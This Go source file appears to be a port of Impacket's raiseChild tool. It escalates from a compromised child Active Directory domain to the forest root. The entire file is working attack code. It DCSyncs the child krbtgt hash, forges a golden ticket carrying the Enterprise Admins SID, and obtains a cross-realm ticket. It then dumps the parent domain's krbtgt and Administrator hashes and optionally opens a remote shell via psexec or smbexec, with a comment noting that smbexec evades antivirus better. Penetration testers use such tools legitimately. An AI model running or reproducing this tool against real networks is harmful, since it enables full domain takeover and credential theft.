// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Jacob Paullus

package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"gopacket/pkg/dcerpc"
	"gopacket/pkg/dcerpc/drsuapi"
	"gopacket/pkg/dcerpc/epmapper"
	"gopacket/pkg/dcerpc/lsarpc"
	"gopacket/pkg/dcerpc/netlogon"
	"gopacket/pkg/flags"
	"gopacket/pkg/kerberos"
	"gopacket/pkg/session"
	"gopacket/pkg/smb"
)

var (
	parentDC   = flag.String("parent-dc", "", "IP address of the parent domain DC (auto-discovered if omitted)")
	writeTkt   = flag.String("w", "", "Save golden ticket to ccache file")
	targetRID  = flag.Int("targetRID", 500, "Target user RID in parent domain (default: 500 = Administrator)")
	targetExec = flag.String("target-exec", "", "Launch psexec against this host after escalation")
)

func main() {
	flags.ExtraUsageText = `
Positional arguments:
  target           [[domain/]username[:password]@]<childDC>

Examples:
  raiseChild 'child.domain.local/administrator:Password123@child-dc.child.domain.local'
  raiseChild 'child.domain.local/administrator:Password123@child-dc.child.domain.local' -parent-dc parent-dc.domain.local
  raiseChild 'child.domain.local/administrator@child-dc.child.domain.local' -hashes :NTHASH
  raiseChild 'child.domain.local/administrator:Password123@child-dc.child.domain.local' -target-exec parent-dc.domain.local
`

	opts := flags.Parse()
	if opts.TargetStr == "" {
		flag.Usage()
		fmt.Fprintln(os.Stderr, "\n[-] target is required")
		os.Exit(1)
	}

	target, creds, err := session.ParseTargetString(opts.TargetStr)
	if err != nil {
		log.Fatalf("[-] %v", err)
	}
	opts.ApplyToSession(&target, &creds)

	if err := session.EnsurePassword(&creds); err != nil {
		log.Fatalf("[-] %v", err)
	}

	if target.Port == 0 {
		target.Port = 445
	}

	// Phase 1: Get child domain info via LSARPC + NTLM target info
	fmt.Printf("[*] Raising child domain %s\n", creds.Domain)

	childDomainSID, forestFQDN, err := queryChildDomainInfo(target, &creds)
	if err != nil {
		log.Fatalf("[-] Failed to get child domain info: %v", err)
	}
	fmt.Printf("[*] Child domain SID: %s\n", childDomainSID)

	// If no forest FQDN from NTLM, try NRPC DsrGetDcNameEx
	if forestFQDN == "" {
		nrpcForest, err := discoverForestNRPC(target, &creds)
		if err == nil && nrpcForest != "" {
			forestFQDN = nrpcForest
		}
	}

	if forestFQDN != "" {
		fmt.Printf("[*] Forest FQDN is: %s\n", forestFQDN)
	}

	// Auto-discover parent DC if not specified
	if *parentDC == "" {
		parentIP := discoverParentDC(forestFQDN, target, &creds)
		if parentIP == "" {
			log.Fatalf("[-] Could not auto-discover parent DC. Use -parent-dc to specify manually.")
		}
		parentDC = &parentIP
		fmt.Printf("[*] Discovered parent DC: %s\n", *parentDC)
	}

	// Phase 2: Get parent domain info via LSARPC + resolve parent DC FQDN
	parentTarget := session.Target{Host: *parentDC, Port: 445}
	parentDomainName, parentDomainSID, parentDCHostname, err := queryParentDomainInfo(parentTarget, &creds)
	if err != nil {
		log.Fatalf("[-] Failed to get parent domain info: %v", err)
	}

	// Use the forest FQDN from NTLM if we got it, otherwise use LSARPC domain name
	parentDomainFQDN := strings.ToLower(parentDomainName)
	if forestFQDN != "" {
		parentDomainFQDN = forestFQDN
	}
	fmt.Printf("[*] Forest SID: %s\n", parentDomainSID)

	// Resolve target user in parent domain
	targetSID := fmt.Sprintf("%s-%d", parentDomainSID, *targetRID)
	targetUsername, err := resolveSID(parentTarget, &creds, *parentDC, targetSID)
	if err != nil {
		fmt.Printf("[!] Could not resolve SID %s, using default 'Administrator'\n", targetSID)
		targetUsername = "Administrator"
	}

	// Phase 3: DCSync child domain krbtgt
	fmt.Printf("[*] Getting credentials for child domain\n")

	childNetbios := strings.ToUpper(strings.Split(creds.Domain, ".")[0])
	krbtgtObj, err := dcsyncUser(target, creds, creds.Domain, childNetbios+"\\krbtgt")
	if err != nil {
		log.Fatalf("[-] Failed to DCSync child krbtgt: %v", err)
	}

	// Print child krbtgt creds
	ntHash := hex.EncodeToString(krbtgtObj.NTHash)
	fmt.Printf("%s\\krbtgt:%d:aad3b435b51404eeaad3b435b51404ee:%s:::\n",
		childNetbios, krbtgtObj.RID, ntHash)

	var aes256Key string
	for _, key := range krbtgtObj.KerberosKeys {
		keyTypeName := drsuapi.GetKeyTypeName(key.KeyType)
		keyHex := hex.EncodeToString(key.KeyValue)
		fmt.Printf("%s\\krbtgt:%s:%s\n", childNetbios, keyTypeName, keyHex)
		if key.KeyType == 18 { // AES256
			aes256Key = keyHex
		}
	}

	// Phase 4: Forge golden ticket with ExtraSIDs
	fmt.Printf("[*] Forging inter-realm TGT\n")

	// Enterprise Admins SID = parentSID-519
	enterpriseAdminsSID := fmt.Sprintf("%s-519", parentDomainSID)

	childRealm := strings.ToUpper(creds.Domain)

	ticketCfg := &kerberos.TicketConfig{
		Username:  targetUsername,
		Domain:    creds.Domain,
		DomainSID: childDomainSID,
		ExtraSIDs: []string{enterpriseAdminsSID},
		UserID:    uint32(*targetRID),
	}

	// Prefer AES256 if available
	if aes256Key != "" {
		ticketCfg.AESKey = aes256Key
	} else {
		ticketCfg.NTHash = ntHash
	}

	ticketResult, err := kerberos.CreateTicket(ticketCfg)
	if err != nil {
		log.Fatalf("[-] Failed to forge golden ticket: %v", err)
	}

	// Determine ccache filename
	ccacheFilename := strings.ToLower(targetUsername) + ".ccache"
	if *writeTkt != "" {
		ccacheFilename = *writeTkt
	}

	// Phase 5: Cross-realm TGS-REQ
	parentRealm := strings.ToUpper(parentDomainFQDN)
	crossRealmSPN := fmt.Sprintf("krbtgt/%s", parentRealm)

	// Build session key from the ticket result
	sessionKey := kerberos.EncKeyFromTicketResult(ticketResult)

	// Request inter-realm TGT from child KDC
	childKDC := target.Host
	if target.IP != "" {
		childKDC = target.IP
	}

	tgsResult, err := kerberos.RequestTGS(ticketResult.Ticket, sessionKey,
		crossRealmSPN, targetUsername, childRealm, childKDC)
	if err != nil {
		log.Fatalf("[-] Cross-realm TGS-REQ failed: %v", err)
	}

	// Phase 6: DCSync parent domain using Kerberos

	// Save multi-entry ccache with forged TGT + inter-realm TGT
	now := time.Now().UTC()
	endTime := now.Add(87600 * time.Hour)
	renewTill := endTime

	cname := kerberos.MakePrincipalName(1, targetUsername)
	childKrbtgtSName := kerberos.MakePrincipalName(2, "krbtgt/"+childRealm)
	parentKrbtgtSName := kerberos.MakePrincipalName(2, crossRealmSPN)

	entries := []kerberos.CacheEntry{
		{
			TicketBytes: ticketResult.Ticket,
			SessionKey:  sessionKey,
			CName:       cname,
			CRealm:      childRealm,
			SName:       childKrbtgtSName,
			SRealm:      childRealm,
			AuthTime:    now,
			EndTime:     endTime,
			RenewTill:   renewTill,
			Flags:       0x50e10000,
		},
		{
			TicketBytes: tgsResult.Ticket,
			SessionKey:  tgsResult.SessionKey,
			CName:       cname,
			CRealm:      childRealm,
			SName:       parentKrbtgtSName,
			SRealm:      parentRealm,
			AuthTime:    tgsResult.AuthTime,
			EndTime:     tgsResult.EndTime,
			RenewTill:   tgsResult.RenewTill,
			Flags:       tgsResult.Flags,
		},
	}

	if err := kerberos.SaveMultiCCache(ccacheFilename, entries); err != nil {
		log.Fatalf("[-] Failed to save multi-entry ccache: %v", err)
	}
	fmt.Printf("[*] Saved multi-entry ccache to %s\n", ccacheFilename)

	// Set KRB5CCNAME and do parent DCSync
	os.Setenv("KRB5CCNAME", ccacheFilename)

	parentCreds := session.Credentials{
		Domain:      parentDomainFQDN,
		Username:    targetUsername,
		UseKerberos: true,
		DCIP:        *parentDC,
	}

	parentNetbios := strings.ToUpper(strings.Split(parentDomainFQDN, ".")[0])

	// DCSync parent krbtgt
	fmt.Printf("[*] DCSync parent domain %s\n", parentDomainFQDN)
	parentKrbtgt, err := dcsyncUserKerberos(*parentDC, parentDCHostname, parentCreds, parentNetbios+"\\krbtgt", childRealm, childKDC)
	if err != nil {
		log.Fatalf("[-] Failed to DCSync parent krbtgt: %v", err)
	}

	printDCSyncResult(parentNetbios, "krbtgt", parentKrbtgt)

	// DCSync target user
	parentUser, err := dcsyncUserKerberos(*parentDC, parentDCHostname, parentCreds, parentNetbios+"\\"+targetUsername, childRealm, childKDC)
	if err != nil {
		log.Fatalf("[-] Failed to DCSync parent %s: %v", targetUsername, err)
	}

	printDCSyncResult(parentNetbios, targetUsername, parentUser)

	// Optional: PSEXEC via -target-exec
	if *targetExec != "" {
		parentNTHash := hex.EncodeToString(parentUser.NTHash)
		execTargetStr := fmt.Sprintf("%s/%s@%s", parentDomainFQDN, targetUsername, *targetExec)

		fmt.Printf("[*] Launching semi-interactive shell on %s as %s\\%s\n", *targetExec, parentNetbios, targetUsername)

		execPath := findExecTool()
		if execPath == "" {
			log.Fatalf("[-] Could not find smbexec or psexec binary. Build with 'make' first.")
		}
		cmd := exec.Command(execPath, "-hashes", ":"+parentNTHash, execTargetStr)
		cmd.Stdin = os.Stdin
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		if err := cmd.Run(); err != nil {
			log.Fatalf("[-] PSEXEC failed: %v", err)
		}
		return
	}

	fmt.Println("[*] Done!")
}

// discoverForestNRPC uses MS-NRPC DsrGetDcNameEx to discover the forest DNS name.
func discoverForestNRPC(target session.Target, creds *session.Credentials) (string, error) {
	smbClient := smb.NewClient(target, creds)
	if err := smbClient.Connect(); err != nil {
		return "", fmt.Errorf("SMB connection failed: %v", err)
	}
	defer smbClient.Close()

	pipe, err := smbClient.OpenPipe("netlogon")
	if err != nil {
		return "", fmt.Errorf("failed to open netlogon pipe: %v", err)
	}

	rpcClient := dcerpc.NewClient(pipe)
	if err := rpcClient.Bind(netlogon.UUID, netlogon.MajorVersion, netlogon.MinorVersion); err != nil {
		return "", fmt.Errorf("netlogon bind failed: %v", err)
	}

	info, err := netlogon.DsrGetDcNameEx(rpcClient, "", "", 0)
	if err != nil {
		return "", err
	}

	return strings.ToLower(info.DnsForestName), nil
}

// discoverParentDC attempts to find the parent domain DC IP.
// First tries NRPC to ask the child DC for a DC in the forest root domain,
// then falls back to DNS resolution of the forest FQDN.
func discoverParentDC(forestFQDN string, target session.Target, creds *session.Credentials) string {
	if forestFQDN == "" {
		return ""
	}

	// Try NRPC: ask child DC for a DC in the forest root domain
	smbClient := smb.NewClient(target, creds)
	if err := smbClient.Connect(); err == nil {
		defer smbClient.Close()

		pipe, err := smbClient.OpenPipe("netlogon")
		if err == nil {
			rpcClient := dcerpc.NewClient(pipe)
			if err := rpcClient.Bind(netlogon.UUID, netlogon.MajorVersion, netlogon.MinorVersion); err == nil {
				info, err := netlogon.DsrGetDcNameEx(rpcClient, "", forestFQDN, netlogon.DS_RETURN_DNS_NAME)
				if err == nil && info.DomainControllerAddress != "" {
					fmt.Printf("[*] NRPC discovered parent DC: %s (%s)\n",
						info.DomainControllerName, info.DomainControllerAddress)
					return info.DomainControllerAddress
				}
			}
		}
	}

	// Fallback: DNS resolution of forest FQDN
	addrs, err := net.LookupHost(forestFQDN)
	if err == nil && len(addrs) > 0 {
		fmt.Printf("[*] DNS resolved %s to %s\n", forestFQDN, addrs[0])
		return addrs[0]
	}

	return ""
}

// queryChildDomainInfo connects via SMB to the child DC, queries domain SID via LSARPC,
// and extracts the forest FQDN from the NTLM challenge.
func queryChildDomainInfo(target session.Target, creds *session.Credentials) (string, string, error) {
	smbClient := smb.NewClient(target, creds)
	if err := smbClient.Connect(); err != nil {
		return "", "", fmt.Errorf("SMB connection to %s failed: %v", target.Host, err)
	}
	defer smbClient.Close()

	// Get forest FQDN from NTLM target info
	forestFQDN := smbClient.GetDNSTreeName()

	pipe, err := smbClient.OpenPipe("lsarpc")
	if err != nil {
		return "", "", fmt.Errorf("failed to open lsarpc pipe: %v", err)
	}

	rpcClient := dcerpc.NewClient(pipe)
	if err := rpcClient.Bind(lsarpc.UUID, lsarpc.MajorVersion, lsarpc.MinorVersion); err != nil {
		return "", "", fmt.Errorf("LSARPC bind failed: %v", err)
	}

	lsaClient, err := lsarpc.NewLsaClient(rpcClient)
	if err != nil {
		return "", "", fmt.Errorf("failed to create LSA client: %v", err)
	}
	defer lsaClient.Close()

	_, domainSID, err := lsaClient.QueryPrimaryDomainSID()
	if err != nil {
		return "", "", err
	}

	return domainSID, forestFQDN, nil
}

// queryParentDomainInfo connects via SMB to the parent DC, queries domain SID via LSARPC,
// and extracts the DC FQDN from the NTLM challenge for Kerberos SPN.
func queryParentDomainInfo(target session.Target, creds *session.Credentials) (string, string, string, error) {
	smbClient := smb.NewClient(target, creds)
	if err := smbClient.Connect(); err != nil {
		return "", "", "", fmt.Errorf("SMB connection to %s failed: %v", target.Host, err)
	}
	defer smbClient.Close()

	// Get parent DC FQDN from NTLM target info
	parentDCHostname := smbClient.GetDNSHostName()

	pipe, err := smbClient.OpenPipe("lsarpc")
	if err != nil {
		return "", "", "", fmt.Errorf("failed to open lsarpc pipe: %v", err)
	}

	rpcClient := dcerpc.NewClient(pipe)
	if err := rpcClient.Bind(lsarpc.UUID, lsarpc.MajorVersion, lsarpc.MinorVersion); err != nil {
		return "", "", "", fmt.Errorf("LSARPC bind failed: %v", err)
	}

	lsaClient, err := lsarpc.NewLsaClient(rpcClient)
	if err != nil {
		return "", "", "", fmt.Errorf("failed to create LSA client: %v", err)
	}
	defer lsaClient.Close()

	domainName, domainSID, err := lsaClient.QueryPrimaryDomainSID()
	if err != nil {
		return "", "", "", err
	}

	return domainName, domainSID, parentDCHostname, nil
}

// resolveSID connects via SMB to LSARPC and resolves a SID to a username.
func resolveSID(target session.Target, creds *session.Credentials, host, sid string) (string, error) {
	smbClient := smb.NewClient(target, creds)
	if err := smbClient.Connect(); err != nil {
		return "", fmt.Errorf("SMB connection to %s failed: %v", host, err)
	}
	defer smbClient.Close()

	pipe, err := smbClient.OpenPipe("lsarpc")
	if err != nil {
		return "", fmt.Errorf("failed to open lsarpc pipe: %v", err)
	}

	rpcClient := dcerpc.NewClient(pipe)
	if err := rpcClient.Bind(lsarpc.UUID, lsarpc.MajorVersion, lsarpc.MinorVersion); err != nil {
		return "", fmt.Errorf("LSARPC bind failed: %v", err)
	}

	lsaClient, err := lsarpc.NewLsaClient(rpcClient)
	if err != nil {
		return "", fmt.Errorf("failed to create LSA client: %v", err)
	}
	defer lsaClient.Close()

	results, err := lsaClient.LookupSids([]string{sid})
	if err != nil {
		return "", err
	}

	if len(results) > 0 && results[0].Name != "" {
		return results[0].Name, nil
	}
	return "", fmt.Errorf("SID not resolved")
}

// dcsyncUser performs DCSync for a single user via NTLM auth.
func dcsyncUser(target session.Target, creds session.Credentials, domain, nt4Name string) (*drsuapi.ReplicatedObject, error) {
	// Map DRSUAPI endpoint
	host := target.Host
	if target.IP != "" {
		host = target.IP
	}
	port, err := epmapper.MapTCPEndpoint(host, drsuapi.UUID, drsuapi.MajorVersion)
	if err != nil {
		return nil, fmt.Errorf("failed to map DRSUAPI endpoint: %v", err)
	}

	transport, err := dcerpc.DialTCP(host, port)
	if err != nil {
		return nil, fmt.Errorf("failed to connect to DRSUAPI: %v", err)
	}
	defer transport.Close()

	rpcClient := dcerpc.NewClientTCP(transport)
	if err := rpcClient.BindAuth(drsuapi.UUID, drsuapi.MajorVersion, drsuapi.MinorVersion, &creds); err != nil {
		return nil, fmt.Errorf("BindAuth failed: %v", err)
	}

	bindResult, err := drsuapi.DsBind(rpcClient)
	if err != nil {
		return nil, fmt.Errorf("DsBind failed: %v", err)
	}

	dcInfo, err := drsuapi.DsDomainControllerInfo(rpcClient, bindResult.Handle, domain)
	if err != nil {
		return nil, fmt.Errorf("DsDomainControllerInfo failed: %v", err)
	}

	domainDN, err := drsuapi.GetDomainDN(rpcClient, bindResult.Handle, domain)
	if err != nil {
		return nil, fmt.Errorf("failed to resolve domain DN: %v", err)
	}

	sessionKey := rpcClient.GetSessionKey()
	netbios := strings.ToUpper(strings.Split(domain, ".")[0])

	// Crack name to GUID
	crackResults, err := drsuapi.DsCrackNames(rpcClient, bindResult.Handle,
		drsuapi.DS_NT4_ACCOUNT_NAME, drsuapi.DS_UNIQUE_ID_NAME, []string{nt4Name})
	if err != nil {
		return nil, fmt.Errorf("DsCrackNames failed: %v", err)
	}

	var targetGUID string
	for _, r := range crackResults {
		if r.Status == drsuapi.DS_NAME_NO_ERROR && r.Name != "" {
			targetGUID = r.Name
		}
	}
	if targetGUID == "" {
		return nil, fmt.Errorf("could not resolve %s to GUID (netbios=%s)", nt4Name, netbios)
	}

	result, err := drsuapi.DsGetNCChanges(rpcClient, bindResult.Handle, domainDN, targetGUID, dcInfo.NtdsDsaObjectGuid, sessionKey)
	if err != nil {
		return nil, fmt.Errorf("DsGetNCChanges failed: %v", err)
	}

	if len(result.Objects) == 0 {
		return nil, fmt.Errorf("no objects returned for %s", nt4Name)
	}

	return &result.Objects[0], nil
}

// dcsyncUserKerberos performs DCSync for a single user via Kerberos auth.
func dcsyncUserKerberos(parentDCIP string, parentDCHostname string, creds session.Credentials, nt4Name string, childRealm, childKDC string) (*drsuapi.ReplicatedObject, error) {
	port, err := epmapper.MapTCPEndpoint(parentDCIP, drsuapi.UUID, drsuapi.MajorVersion)
	if err != nil {
		return nil, fmt.Errorf("failed to map DRSUAPI endpoint: %v", err)
	}

	transport, err := dcerpc.DialTCP(parentDCIP, port)
	if err != nil {
		return nil, fmt.Errorf("failed to connect to DRSUAPI: %v", err)
	}
	defer transport.Close()

	rpcClient := dcerpc.NewClientTCP(transport)

	// Configure multi-realm Kerberos with child and parent realms
	extraRealms := map[string]string{
		strings.ToLower(childRealm): childKDC,
	}

	// Kerberos bind using multi-realm handler
	target := session.Target{Host: parentDCIP}
	auth, err := dcerpc.NewKerberosAuthHandlerMultiRealm(&creds, target, parentDCIP, extraRealms)
	if err != nil {
		return nil, fmt.Errorf("failed to create multi-realm Kerberos handler: %v", err)
	}

	// Use hostname-based SPN (Kerberos requires FQDN, not IP)
	spnHost := parentDCHostname
	if spnHost == "" {
		spnHost = parentDCIP
	}
	spn := fmt.Sprintf("host/%s", spnHost)
	if err := rpcClient.BindAuthKerberosWithHandler(drsuapi.UUID, drsuapi.MajorVersion, drsuapi.MinorVersion, auth, spn); err != nil {
		return nil, fmt.Errorf("BindAuthKerberos failed: %v", err)
	}

	bindResult, err := drsuapi.DsBind(rpcClient)
	if err != nil {
		return nil, fmt.Errorf("DsBind failed: %v", err)
	}

	dcInfo, err := drsuapi.DsDomainControllerInfo(rpcClient, bindResult.Handle, creds.Domain)
	if err != nil {
		return nil, fmt.Errorf("DsDomainControllerInfo failed: %v", err)
	}

	domainDN, err := drsuapi.GetDomainDN(rpcClient, bindResult.Handle, creds.Domain)
	if err != nil {
		return nil, fmt.Errorf("failed to resolve domain DN: %v", err)
	}

	sessionKey := rpcClient.GetSessionKey()

	// Crack name to GUID
	crackResults, err := drsuapi.DsCrackNames(rpcClient, bindResult.Handle,
		drsuapi.DS_NT4_ACCOUNT_NAME, drsuapi.DS_UNIQUE_ID_NAME, []string{nt4Name})
	if err != nil {
		return nil, fmt.Errorf("DsCrackNames failed: %v", err)
	}

	var targetGUID string
	for _, r := range crackResults {
		if r.Status == drsuapi.DS_NAME_NO_ERROR && r.Name != "" {
			targetGUID = r.Name
		}
	}
	if targetGUID == "" {
		return nil, fmt.Errorf("could not resolve %s to GUID", nt4Name)
	}

	result, err := drsuapi.DsGetNCChanges(rpcClient, bindResult.Handle, domainDN, targetGUID, dcInfo.NtdsDsaObjectGuid, sessionKey)
	if err != nil {
		return nil, fmt.Errorf("DsGetNCChanges failed: %v", err)
	}

	if len(result.Objects) == 0 {
		return nil, fmt.Errorf("no objects returned for %s", nt4Name)
	}

	return &result.Objects[0], nil
}

// findExecTool searches for smbexec (preferred) or psexec binary.
func findExecTool() string {
	binDir := filepath.Dir(os.Args[0])
	// Prefer smbexec (no binary upload, works better with AV)
	for _, tool := range []string{"smbexec", "psexec"} {
		candidates := []string{
			filepath.Join(binDir, tool),
			"./bin/" + tool,
		}
		if p, err := exec.LookPath(tool); err == nil {
			candidates = append(candidates, p)
		}
		for _, c := range candidates {
			if _, err := os.Stat(c); err == nil {
				return c
			}
		}
	}
	return ""
}

// printDCSyncResult prints replicated object credentials in Impacket format.
func printDCSyncResult(netbios, name string, obj *drsuapi.ReplicatedObject) {
	ntHash := "31d6cfe0d16ae931b73c59d7e0c089c0"
	if len(obj.NTHash) == 16 {
		ntHash = hex.EncodeToString(obj.NTHash)
	}
	fmt.Printf("%s\\%s:%d:aad3b435b51404eeaad3b435b51404ee:%s:::\n",
		netbios, obj.SAMAccountName, obj.RID, ntHash)

	for _, key := range obj.KerberosKeys {
		fmt.Printf("%s\\%s:%s:%s\n",
			netbios, obj.SAMAccountName,
			drsuapi.GetKeyTypeName(key.KeyType),
			hex.EncodeToString(key.KeyValue))
	}
}
